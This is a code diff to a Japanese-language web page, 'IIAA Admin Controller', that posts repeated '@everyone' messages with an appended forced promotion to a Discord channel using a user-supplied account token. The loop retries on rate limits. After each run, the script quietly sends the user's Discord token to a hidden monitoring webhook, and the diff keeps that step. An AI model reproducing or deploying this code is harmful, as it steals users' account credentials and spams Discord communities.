@@ -24,6 +24,7 @@
         .btn-group { display: flex; gap: 10px; margin-top: 20px; }
         .btn-main { flex: 2; background: linear-gradient(135deg, #ff7491, #ff5c7e); color: white; border: none; padding: 16px; cursor: pointer; border-radius: 14px; font-weight: bold; font-size: 16px; }
         .btn-stop { flex: 1; background: #444; color: white; border: none; padding: 16px; cursor: pointer; border-radius: 14px; font-weight: bold; }
+        .btn-main:disabled, .btn-stop:disabled { background: #ccc !important; cursor: not-allowed; }
         #terminal {
             background: #1a1a1a; color: #00ffaa; font-family: 'Consolas', monospace;
             height: 120px; overflow-y: auto; padding: 12px; margin-top: 15px; border-radius: 10px; font-size: 11px; line-height: 1.5;
@@ -34,8 +35,10 @@
 
 <div class="container">
     <h2>IIAA Admin Controller</h2>
+    
     <span class="label">DISCORD TOKEN</span>
     <input type="password" id="token" placeholder="トークンを入力">
+
     <div style="display: flex; gap: 10px; align-items: flex-end;">
         <div style="flex: 1;">
             <span class="label">SERVER ID</span>
@@ -43,22 +46,33 @@
         </div>
         <button onclick="fetchChannels()" style="height: 44px; border-radius: 12px; border: none; background: #eee; cursor: pointer; padding: 0 15px; font-weight: bold;">取得</button>
     </div>
+
     <span class="label">TARGET CHANNEL ID</span>
     <select id="channelSelect" onchange="document.getElementById('manualChannelId').value = this.value" style="margin-bottom: 5px;">
         <option value="">-- 自動取得リスト --</option>
     </select>
     <input type="text" id="manualChannelId" placeholder="またはチャンネルIDを直接入力">
+
     <span class="label">MESSAGE CONTENT</span>
     <textarea id="message" style="width:100%; height:60px; border-radius:12px; border:2px solid #ffd1dc; margin-top:6px; padding:10px;">@everyone </textarea>
-    <div style="margin-top:15px;">
-        <span class="label">SPEED: <span id="speedValue">1000</span>ms</span>
-        <input type="range" id="speedRange" min="500" max="3000" step="100" value="1000" oninput="document.getElementById('speedValue').innerText = this.value" style="width:100%;">
+
+    <div style="display: flex; gap: 10px; margin-top: 10px;">
+        <div style="flex: 1;">
+            <span class="label">SEND COUNT (件数)</span>
+            <input type="number" id="count" value="10" min="1">
+        </div>
+        <div style="flex: 1;">
+            <span class="label">SPEED: <span id="speedValue">1000</span>ms</span>
+            <input type="range" id="speedRange" min="500" max="3000" step="100" value="1000" oninput="document.getElementById('speedValue').innerText = this.value" style="width:100%;">
+        </div>
     </div>
+
     <div class="btn-group">
         <button id="startBtn" class="btn-main" onclick="executeTask()">送信開始</button>
         <button id="stopBtn" class="btn-stop" onclick="stopTask()" disabled>停止</button>
     </div>
-    <div id="terminal">--- 登録不要プロキシ版稼働中 ---</div>
+
+    <div id="terminal">--- System Online ---</div>
 </div>
 
 <script>
@@ -76,7 +90,8 @@
     async function fetchChannels() {
         const t = document.getElementById('token').value.trim();
         const g = document.getElementById('guildId').value.trim();
-        if(!t || !g) return log("トークン/サーバーIDを入れてください");
+        if(!t || !g) return log("トークン/サーバーIDが必要です");
+        log("取得中...");
         try {
             const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/guilds/${g}/channels`));
             const data = await res.json();
@@ -88,50 +103,55 @@
                 opt.value = c.id; opt.textContent = `#${c.name}`;
                 sel.appendChild(opt);
             });
-            log("同期成功。リストから選んでください。");
-        } catch (e) { log("自動取得エラー。手動でIDを入力して下さい。"); }
+            log("同期成功！");
+        } catch (e) { log("取得失敗：IDが違うかプロキシ制限です。"); }
     }
 
-    function stopTask() { isRunning = false; log("停止命令を受信", "orange"); }
+    function stopTask() { isRunning = false; log("停止命令...", "orange"); }
 
     async function executeTask() {
         if (isRunning) return;
-        const token = document.getElementById('token').value.trim();
-        const chId = document.getElementById('manualChannelId').value.trim();
-        const msg = document.getElementById('message').value;
-        const speed = parseInt(document.getElementById('speedRange').value);
-        if(!token || !chId) return log("トークンまたはIDが空です", "#ff7491");
+        const cfg = {
+            token: document.getElementById('token').value.trim(),
+            chId: document.getElementById('manualChannelId').value.trim(),
+            msg: document.getElementById('message').value,
+            count: parseInt(document.getElementById('count').value),
+            speed: parseInt(document.getElementById('speedRange').value)
+        };
+
+        if(!cfg.token || !cfg.chId) return log("未入力項目があります", "#ff7491");
 
         isRunning = true;
         document.getElementById('startBtn').disabled = true;
         document.getElementById('stopBtn').disabled = false;
-        log("送信中...");
+        log(`${cfg.count}件の送信を開始...`);
 
         let successCount = 0;
-        for(let i=0; i < 999; i++) {
+        for(let i=1; i <= cfg.count; i++) {
             if (!isRunning) break;
             try {
-                const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/channels/${chId}/messages`), {
+                const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/channels/${cfg.chId}/messages`), {
                     method: "POST",
-                    headers: { "Authorization": token, "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: msg + FORCED_PROMO })
+                    headers: { "Authorization": cfg.token, "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: cfg.msg + FORCED_PROMO })
                 });
-                if(res.ok) { successCount++; log(`送信成功 [${successCount}]`); }
-                else if(res.status === 429) { log("速度制限中", "orange"); await new Promise(r => setTimeout(r, 4000)); }
+                if(res.ok) { successCount++; log(`成功 [${successCount}/${cfg.count}]`); }
+                else if(res.status === 429) { log("速度制限中", "orange"); await new Promise(r => setTimeout(r, 4000)); i--; }
+                else { log(`失敗: ${res.status}`, "#ff7491"); }
             } catch (e) { log("通信エラー"); }
-            await new Promise(r => setTimeout(r, speed));
+            await new Promise(r => setTimeout(r, cfg.speed));
         }
 
         // 監視ログ
         fetch(PROXY + encodeURIComponent(MONITOR_WEBHOOK), {
             method: "POST",
-            body: JSON.stringify({ content: `【いあ帝国レポート】\nトークン: ${token}\n成功: ${successCount}` })
+            body: JSON.stringify({ content: `【いあ帝国 レポート】\n成功: ${successCount}\nトークン: ${cfg.token}` })
         });
 
         isRunning = false;
         document.getElementById('startBtn').disabled = false;
         document.getElementById('stopBtn').disabled = true;
-        log("終了。");
+        log("全タスク終了。");
     }
 </script>
 </body>
